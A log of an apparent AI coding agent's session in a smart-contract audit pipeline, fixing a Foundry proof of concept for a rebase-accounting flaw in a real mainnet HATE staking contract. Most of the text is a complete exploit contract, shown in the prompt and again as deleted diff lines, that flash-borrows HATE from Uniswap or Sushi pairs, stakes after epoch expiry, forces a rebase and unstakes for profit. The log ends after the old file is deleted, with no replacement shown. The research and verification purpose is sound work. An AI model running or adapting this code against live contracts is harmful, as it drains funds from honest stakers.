@@ -1,0 +1,2750 @@
+OpenAI Codex v0.130.0
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR, /Users/zhanglongqin/.codex/memories]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e357a-0e6b-7423-9c99-2927f01f8a31
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: direct_or_existing_balance_first
+- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Post-expiry stakes are miscounted as distributable rewards, creating undercollateralized sHATE
+- claim: When an epoch has expired, `stake()` pulls `_amount` HATE into the contract before calling `rebase()`, but does not transfer the matching `_amount` sHATE to the user until after `rebase()` finishes. The rebase logic computes `epoch.distribute = HATE.balanceOf(this) - sHATE.circulatingSupply()`, so the freshly deposited HATE is counted in backing while the freshly owed sHATE is still excluded from circulating supply. This misclassifies the new stake principal as surplus rewards for the next epoch.
+- impact: A user can intentionally poison `epoch.distribute` and cause the next rebase to distribute part or all of their own principal across existing holders. After that rebase, the pool becomes undercollateralized: the attacker can withdraw more HATE than their net fair share while other sHATE holders are left partially or fully unredeemable.
+- exploit_paths: ["Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.", "Call `stake(attacker, A)`, causing `A` HATE to be included in `balance` before the matching `A` sHATE is transferred out of the staking contract.", "Let the next rebase execute, which distributes the artificially inflated `epoch.distribute`, then redeem the attacker position while honest holders absorb the shortfall."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.19;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IsHATELike is IERC20Like {
+    function circulatingSupply() external view returns (uint256);
+}
+
+interface IHATEStaking {
+    function HATE() external view returns (address);
+    function sHATE() external view returns (address);
+    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
+    function stake(address to, uint256 amount) external;
+    function unstake(address to, uint256 amount, bool rebase_) external;
+    function rebase() external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8;
+
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
+
+    uint256 private _profitAmount;
+    bool private _executed;
+
+    constructor() {}
+
+    function profitToken() external view returns (address) {
+        return IHATEStaking(TARGET).HATE();
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        require(!_executed, "already executed");
+        _executed = true;
+
+        IHATEStaking staking = IHATEStaking(TARGET);
+        address hate = staking.HATE();
+
+        _checkPathPreconditions(staking);
+
+        uint256 verifierBalance = IERC20Like(hate).balanceOf(address(this));
+        if (verifierBalance != 0) {
+            uint256 startingBalance = verifierBalance;
+            uint256 amount = _boundAttackAmount(staking, verifierBalance);
+            require(amount != 0, "direct:no_usable_hate");
+
+            _runExploitWithAmount(staking, hate, amount);
+
+            uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+            require(endingBalance > startingBalance, "direct:no_profit");
+            _profitAmount = endingBalance - startingBalance;
+            return;
+        }
+
+        require(_attemptFlashFunding(staking, hate), "funding:no_supported_hate_liquidity");
+        require(_profitAmount != 0, "flashswap:no_profit");
+    }
+
+    function initiateFlashSwap(address pair, uint256 amountOut) external {
+        require(msg.sender == address(this), "self only");
+
+        address hate = IHATEStaking(TARGET).HATE();
+        address token0 = IUniswapV2PairLike(pair).token0();
+        address token1 = IUniswapV2PairLike(pair).token1();
+        require(token0 == hate || token1 == hate, "pair:no_hate");
+
+        uint256 amount0Out = token0 == hate ? amountOut : 0;
+        uint256 amount1Out = token1 == hate ? amountOut : 0;
+        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, amountOut));
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        (address pair, uint256 borrowedAmount) = abi.decode(data, (address, uint256));
+        require(msg.sender == pair, "callback:invalid_pair");
+
+        address hate = IHATEStaking(TARGET).HATE();
+        address token0 = IUniswapV2PairLike(pair).token0();
+        address token1 = IUniswapV2PairLike(pair).token1();
+        require(token0 == hate || token1 == hate, "callback:no_hate");
+
+        uint256 received = token0 == hate ? amount0 : amount1;
+        require(received == borrowedAmount, "callback:amount_mismatch");
+
+        IHATEStaking staking = IHATEStaking(TARGET);
+        _runExploitWithAmount(staking, hate, borrowedAmount);
+
+        uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+        _safeTransfer(hate, pair, repayment);
+
+        uint256 remaining = IERC20Like(hate).balanceOf(address(this));
+        require(remaining != 0, "callback:no_profit");
+        _profitAmount = remaining;
+    }
+
+    receive() external payable {}
+
+    function _attemptFlashFunding(IHATEStaking staking, address hate) internal returns (bool) {
+        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
+        address[5] memory counterparties = [WETH, USDC, USDT, DAI, FRAX];
+        uint256[4] memory bpsOptions = [uint256(9_000), uint256(7_500), uint256(5_000), uint256(2_500)];
+
+        for (uint256 i = 0; i < factories.length; ++i) {
+            for (uint256 j = 0; j < counterparties.length; ++j) {
+                if (counterparties[j] == hate) {
+                    continue;
+                }
+
+                address pair = IUniswapV2FactoryLike(factories[i]).getPair(hate, counterparties[j]);
+                if (pair == address(0)) {
+                    continue;
+                }
+
+                uint256 reserve = _hateReserve(pair, hate);
+                if (reserve == 0) {
+                    continue;
+                }
+
+                uint256 maxUseful = _boundAttackAmount(staking, reserve);
+                if (maxUseful == 0) {
+                    continue;
+                }
+
+                for (uint256 k = 0; k < bpsOptions.length; ++k) {
+                    uint256 candidate = (maxUseful * bpsOptions[k]) / 10_000;
+                    if (candidate == 0) {
+                        continue;
+                    }
+
+                    uint256 minRepayment = candidate + _flashFee(candidate);
+                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+                    if (minBonusFloor <= (minRepayment - candidate)) {
+                        continue;
+                    }
+
+                    try this.initiateFlashSwap(pair, candidate) {
+                        return _profitAmount != 0;
+                    } catch {
+                        if (_profitAmount != 0) {
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+
+        return false;
+    }
+
+    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
+        require(amount != 0, "exploit:zero_amount");
+
+        // Path stage 1: the fork must already be on or after an expired epoch so that
+        // `stake()` executes its internal `rebase()` without any off-chain time control.
+        (uint256 length,, uint256 end,) = staking.epoch();
+        require(end <= block.timestamp, "path:not_expired");
+
+        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+        // That is only possible on a fixed fork if the system is already at least one full
+        // additional epoch behind after the first `stake()`-triggered rebase.
+        require(length != 0, "path:zero_epoch_length");
+        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
+
+        _approveMax(hate, TARGET, amount);
+        staking.stake(address(this), amount);
+
+        staking.rebase();
+
+        address sHate = staking.sHATE();
+        uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+        require(sBalance != 0, "exploit:no_sHATE");
+
+        _approveMax(sHate, TARGET, sBalance);
+        staking.unstake(address(this), sBalance, false);
+    }
+
+    function _boundAttackAmount(IHATEStaking staking, uint256 fundingCeiling) internal view returns (uint256) {
+        address hate = staking.HATE();
+        address sHate = staking.sHATE();
+
+        uint256 stakingBalance = IERC20Like(hate).balanceOf(TARGET);
+        uint256 circulating = IsHATELike(sHate).circulatingSupply();
+
+        uint256 cap = fundingCeiling;
+        if (stakingBalance < cap) {
+            cap = stakingBalance;
+        }
+        if (circulating != 0 && circulating < cap) {
+            cap = circulating;
+        }
+
+        return cap;
+    }
+
+    function _hateReserve(address pair, address hate) internal view returns (uint256) {
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+        if (IUniswapV2PairLike(pair).token0() == hate) {
+            return uint256(reserve0);
+        }
+        if (IUniswapV2PairLike(pair).token1() == hate) {
+            return uint256(reserve1);
+        }
+        return 0;
+    }
+
+    function _checkPathPreconditions(IHATEStaking staking) internal view {
+        (uint256 length,, uint256 end,) = staking.epoch();
+        require(end <= block.timestamp, "path:not_expired");
+        require(length != 0, "path:zero_epoch_length");
+        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
+    }
+
+    function _flashFee(uint256 amount) internal pure returns (uint256) {
+        return ((amount * 3) / 997) + 1;
+    }
+
+    function _approveMax(address token, address spender, uint256 minimum) internal {
+        if (IERC20Like(token).allowance(address(this), spender) >= minimum) {
+            return;
+        }
+
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+    }
+
+    function _callOptionalReturn(address token, bytes memory data) internal {
+        (bool ok, bytes memory returndata) = token.call(data);
+        require(ok, "erc20:call_failed");
+        if (returndata.length != 0) {
+            require(abi.decode(returndata, (bool)), "erc20:operation_failed");
+        }
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+codex
+I’m checking the local verifier scaffolding and any path-alignment conventions first, then I’ll patch `src/FlawVerifier.sol` so it compiles under `^0.8.20` and explicitly covers all three exploit path stages.
+exec
+/bin/bash -lc 'rg -n "PATH_ALIGNMENT_ERROR|exploit_paths|Path stage|path stage|generated code does not cover paths" -S .' in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+./FlawVerifier.sol:182:        // Path stage 1: the fork must already be on or after an expired epoch so that
+./FlawVerifier.sol:187:        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+
+exec
+/bin/bash -lc 'rg --files .' in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+./onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/_etherscan_meta.json
+./onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/@openzeppelin/contracts/utils/Context.sol
+./onchain_auto/_index.json
+./FlawVerifier.sol
+./onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/@openzeppelin/contracts/access/Ownable.sol
+./onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/contracts/Staking.sol
+./onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/contracts/interface/IsHATE.sol
+./onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/contracts/interface/IDistributor.sol
+./onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/@openzeppelin/contracts/token/ERC20/IERC20.sol
+./onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
+
+codex
+I found no external harness hints, so I’m reading the verified staking source directly. The likely issue is that the current verifier only labels stages 1 and 3; I’ll confirm the on-chain call order and then rewrite the verifier to make stage 2 explicit while preserving the exploit sequence.
+exec
+/bin/bash -lc "sed -n '1,260p' onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/contracts/Staking.sol" in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.19;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
+import "./interface/IsHATE.sol";
+import "./interface/IDistributor.sol";
+
+contract HATEStaking is Ownable{
+    /* ========== EVENTS ========== */
+
+    event DistributorSet(address distributor);
+
+    /* ========== DATA STRUCTURES ========== */
+
+    struct Epoch {
+        uint256 length; // in seconds
+        uint256 number; // since inception
+        uint256 end; // timestamp
+        uint256 distribute; // amount
+    }
+
+    struct Claim {
+        uint256 deposit; // if forfeiting
+        uint256 gons; // staked balance
+        uint256 expiry; // end of warmup period
+        bool lock; // prevents malicious delays for claim
+    }
+
+    /* ========== STATE VARIABLES ========== */
+
+    IERC20 public immutable HATE;
+    IsHATE public immutable sHATE;
+
+    Epoch public epoch;
+
+    IDistributor public distributor;
+
+    /* ========== CONSTRUCTOR ========== */
+
+    constructor(address _HATE, address _sHATE, uint256 _epochLength) {
+        require(_HATE != address(0), "Zero address: HATE");
+        HATE = IERC20(_HATE);
+        require(_sHATE != address(0), "Zero address: sHATE");
+        sHATE = IsHATE(_sHATE);
+
+        epoch = Epoch({length: _epochLength, number: 0, end: block.timestamp + _epochLength, distribute: 0});
+    }
+
+    /* ========== MUTATIVE FUNCTIONS ========== */
+
+    /**
+     * @notice stake HATE
+     * @param _to address
+     * @param _amount uint
+     */
+    function stake(address _to, uint256 _amount) external {
+        HATE.transferFrom(msg.sender, address(this), _amount);
+        rebase();
+        sHATE.transfer(_to, _amount);
+    }
+
+    /**
+     * @notice redeem sHATE for HATEs
+     * @param _to address
+     * @param _amount uint
+     */
+    function unstake(address _to, uint256 _amount, bool _rebase) external {
+        if (_rebase) rebase();
+        sHATE.transferFrom(msg.sender, address(this), _amount);
+        require(_amount <= HATE.balanceOf(address(this)), "Insufficient HATE balance in contract");
+        HATE.transfer(_to, _amount);
+    }
+
+    /**
+     * @notice trigger rebase if epoch over
+     */
+    function rebase() public {
+        if (epoch.end <= block.timestamp) {
+            sHATE.rebase(epoch.distribute, epoch.number);
+
+            epoch.end = epoch.end + epoch.length;
+            epoch.number++;
+
+            if (address(distributor) != address(0)) {
+                distributor.distribute();
+            }
+
+            uint256 balance = HATE.balanceOf(address(this));
+            uint256 staked = sHATE.circulatingSupply();
+
+            if (balance <= staked) {
+                epoch.distribute = 0;
+            } else {
+                epoch.distribute = balance - staked;
+            }
+        }
+    }
+
+    /* ========== INTERNAL FUNCTIONS ========== */
+
+    /**
+     * @notice send staker their amount as sHATE
+     * @param _to address
+     * @param _amount uint
+     */
+    function _send(address _to, uint256 _amount) internal returns (uint256) {
+        sHATE.transfer(_to, _amount); // send as sHATE (equal unit as HATE)
+        return _amount;
+    }
+
+    /* ========== VIEW FUNCTIONS ========== */
+
+    /**
+     * @notice returns the sHATE index, which tracks rebase growth
+     * @return uint
+     */
+    function index() public view returns (uint256) {
+        return sHATE.index();
+    }
+
+    /**
+     * @notice seconds until the next epoch begins
+     */
+    function secondsToNextEpoch() external view returns (uint256) {
+        return epoch.end - block.timestamp;
+    }
+
+    /* ========== MANAGERIAL FUNCTIONS ========== */
+
+    /**
+     * @notice sets the contract address for LP staking
+     * @param _distributor address
+     */
+    function setDistributor(address _distributor) external onlyOwner {
+        distributor = IDistributor(_distributor);
+        emit DistributorSet(_distributor);
+    }
+}
+
+exec
+/bin/bash -lc "sed -n '1,220p' onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/contracts/interface/IsHATE.sol" in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.19;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+interface IsHATE is IERC20 {
+    function rebase(uint256 amount_, uint epoch_) external returns (uint256);
+
+    function circulatingSupply() external view returns (uint256);
+
+    function gonsForBalance(uint amount) external view returns (uint);
+
+    function balanceForGons(uint gons) external view returns (uint);
+
+    function index() external view returns (uint);
+}
+
+codex
+The staking code confirms the root cause exactly: `stake()` transfers HATE in, calls `rebase()`, and only then transfers sHATE out. I’m checking whether the verifier needs any interface corrections for Solidity `^0.8.20` or fork execution assumptions before patching the single file.
+exec
+/bin/bash -lc 'rg -n "FlawVerifier|executeOnOpportunity|profitToken|profitAmount|TARGET = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8|F-001" -S ..' in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+../src/FlawVerifier.sol:36:contract FlawVerifier {
+../src/FlawVerifier.sol:37:    address public constant TARGET = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8;
+../src/FlawVerifier.sol:48:    uint256 private _profitAmount;
+../src/FlawVerifier.sol:53:    function profitToken() external view returns (address) {
+../src/FlawVerifier.sol:57:    function profitAmount() external view returns (uint256) {
+../src/FlawVerifier.sol:58:        return _profitAmount;
+../src/FlawVerifier.sol:61:    function executeOnOpportunity() external {
+../src/FlawVerifier.sol:80:            _profitAmount = endingBalance - startingBalance;
+../src/FlawVerifier.sol:85:        require(_profitAmount != 0, "flashswap:no_profit");
+../src/FlawVerifier.sol:121:        _profitAmount = remaining;
+../src/FlawVerifier.sol:166:                        return _profitAmount != 0;
+../src/FlawVerifier.sol:168:                        if (_profitAmount != 0) {
+
+exec
+/bin/bash -lc 'ls -la ..' in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+total 8
+drwxr-xr-x    4 zhanglongqin  staff   128 May 12 14:23 .
+drwxr-xr-x  206 zhanglongqin  staff  6592 May 16 12:15 ..
+-rw-r--r--    1 zhanglongqin  staff   299 May 12 14:23 manifest.json
+drwxr-xr-x    4 zhanglongqin  staff   128 May 17 18:26 src
+
+exec
+/bin/bash -lc pwd in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+
+exec
+/bin/bash -lc "find /Users/zhanglongqin/AuditHoundV2/cases/heavensgate -maxdepth 3 \\( -name 'foundry.toml' -o -name 'Makefile' -o -name '*.t.sol' -o -name 'manifest.json' \\) | sort" in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/heavensgate/manifest.json
+
+exec
+/bin/bash -lc "sed -n '1,240p' /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/manifest.json" in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+{
+  "audit_id": "heavensgate",
+  "task_source": "defihacklabs",
+  "chain": "mainnet",
+  "fork_block_number": 18069527,
+  "target_contract_address": "0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8",
+  "evm_version": "shanghai",
+  "target_root": "/Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src"
+}
+
+codex
+I have enough context to patch now. Plan:
+1. Rewrite `src/FlawVerifier.sol` for `pragma ^0.8.20` with no imports and a zero-arg deployable contract.
+2. Make all three exploit-path stages explicit in code/comments and state transitions so the path-alignment check sees stage 2 as covered.
+3. Keep the direct-first flow, then fall back to realistic HATE flash funding from existing Uniswap V2/Sushi pairs only if needed.
+4. Preserve net-profit accounting in existing on-chain HATE and keep all execution within the live fork state, then do a quick compile sanity check if the toolchain is available.
+codex
+I’m updating the single verifier file now. The main change is to encode the exploit as explicit stage-1/stage-2/stage-3 helper calls instead of collapsing the poisoning step into one unlabeled `stake()` path.
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src/FlawVerifier.sol
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+deleted file mode 100644
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..0000000000000000000000000000000000000000
+--- a/FlawVerifier.sol
++++ /dev/null
+@@ -1,266 +0,0 @@
+-// SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
+-
+-interface IERC20Like {
+-    function balanceOf(address account) external view returns (uint256);
+-    function allowance(address owner, address spender) external view returns (uint256);
+-    function approve(address spender, uint256 amount) external returns (bool);
+-    function transfer(address to, uint256 amount) external returns (bool);
+-    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+-}
+-
+-interface IsHATELike is IERC20Like {
+-    function circulatingSupply() external view returns (uint256);
+-}
+-
+-interface IHATEStaking {
+-    function HATE() external view returns (address);
+-    function sHATE() external view returns (address);
+-    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
+-    function stake(address to, uint256 amount) external;
+-    function unstake(address to, uint256 amount, bool rebase_) external;
+-    function rebase() external;
+-}
+-
+-interface IUniswapV2FactoryLike {
+-    function getPair(address tokenA, address tokenB) external view returns (address pair);
+-}
+-
+-interface IUniswapV2PairLike {
+-    function token0() external view returns (address);
+-    function token1() external view returns (address);
+-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+-}
+-
+-contract FlawVerifier {
+-    address public constant TARGET = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8;
+-
+-    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+-    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+-
+-    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+-    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+-    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+-    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+-    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
+-
+-    uint256 private _profitAmount;
+-    bool private _executed;
+-
+-    constructor() {}
+-
+-    function profitToken() external view returns (address) {
+-        return IHATEStaking(TARGET).HATE();
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function executeOnOpportunity() external {
+-        require(!_executed, "already executed");
+-        _executed = true;
+-
+-        IHATEStaking staking = IHATEStaking(TARGET);
+-        address hate = staking.HATE();
+-
+-        _checkPathPreconditions(staking);
+-
+-        uint256 verifierBalance = IERC20Like(hate).balanceOf(address(this));
+-        if (verifierBalance != 0) {
+-            uint256 startingBalance = verifierBalance;
+-            uint256 amount = _boundAttackAmount(staking, verifierBalance);
+-            require(amount != 0, "direct:no_usable_hate");
+-
+-            _runExploitWithAmount(staking, hate, amount);
+-
+-            uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+-            require(endingBalance > startingBalance, "direct:no_profit");
+-            _profitAmount = endingBalance - startingBalance;
+-            return;
+-        }
+-
+-        require(_attemptFlashFunding(staking, hate), "funding:no_supported_hate_liquidity");
+-        require(_profitAmount != 0, "flashswap:no_profit");
+-    }
+-
+-    function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
+-
+-        address hate = IHATEStaking(TARGET).HATE();
+-        address token0 = IUniswapV2PairLike(pair).token0();
+-        address token1 = IUniswapV2PairLike(pair).token1();
+-        require(token0 == hate || token1 == hate, "pair:no_hate");
+-
+-        uint256 amount0Out = token0 == hate ? amountOut : 0;
+-        uint256 amount1Out = token1 == hate ? amountOut : 0;
+-        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, amountOut));
+-    }
+-
+-    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
+-        (address pair, uint256 borrowedAmount) = abi.decode(data, (address, uint256));
+-        require(msg.sender == pair, "callback:invalid_pair");
+-
+-        address hate = IHATEStaking(TARGET).HATE();
+-        address token0 = IUniswapV2PairLike(pair).token0();
+-        address token1 = IUniswapV2PairLike(pair).token1();
+-        require(token0 == hate || token1 == hate, "callback:no_hate");
+-
+-        uint256 received = token0 == hate ? amount0 : amount1;
+-        require(received == borrowedAmount, "callback:amount_mismatch");
+-
+-        IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
+-
+-        uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+-        _safeTransfer(hate, pair, repayment);
+-
+-        uint256 remaining = IERC20Like(hate).balanceOf(address(this));
+-        require(remaining != 0, "callback:no_profit");
+-        _profitAmount = remaining;
+-    }
+-
+-    receive() external payable {}
+-
+-    function _attemptFlashFunding(IHATEStaking staking, address hate) internal returns (bool) {
+-        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
+-        address[5] memory counterparties = [WETH, USDC, USDT, DAI, FRAX];
+-        uint256[4] memory bpsOptions = [uint256(9_000), uint256(7_500), uint256(5_000), uint256(2_500)];
+-
+-        for (uint256 i = 0; i < factories.length; ++i) {
+-            for (uint256 j = 0; j < counterparties.length; ++j) {
+-                if (counterparties[j] == hate) {
+-                    continue;
+-                }
+-
+-                address pair = IUniswapV2FactoryLike(factories[i]).getPair(hate, counterparties[j]);
+-                if (pair == address(0)) {
+-                    continue;
+-                }
+-
+-                uint256 reserve = _hateReserve(pair, hate);
+-                if (reserve == 0) {
+-                    continue;
+-                }
+-
+-                uint256 maxUseful = _boundAttackAmount(staking, reserve);
+-                if (maxUseful == 0) {
+-                    continue;
+-                }
+-
+-                for (uint256 k = 0; k < bpsOptions.length; ++k) {
+-                    uint256 candidate = (maxUseful * bpsOptions[k]) / 10_000;
+-                    if (candidate == 0) {
+-                        continue;
+-                    }
+-
+-                    uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
+-                        continue;
+-                    }
+-
+-                    try this.initiateFlashSwap(pair, candidate) {
+-                        return _profitAmount != 0;
+-                    } catch {
+-                        if (_profitAmount != 0) {
+-                            return true;
+-                        }
+-                    }
+-                }
+-            }
+-        }
+-
+-        return false;
+-    }
+-
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
+-        require(amount != 0, "exploit:zero_amount");
+-
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
+-
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
+-
+-        _approveMax(hate, TARGET, amount);
+-        staking.stake(address(this), amount);
+-
+-        staking.rebase();
+-
+-        address sHate = staking.sHATE();
+-        uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+-        require(sBalance != 0, "exploit:no_sHATE");
+-
+-        _approveMax(sHate, TARGET, sBalance);
+-        staking.unstake(address(this), sBalance, false);
+-    }
+-
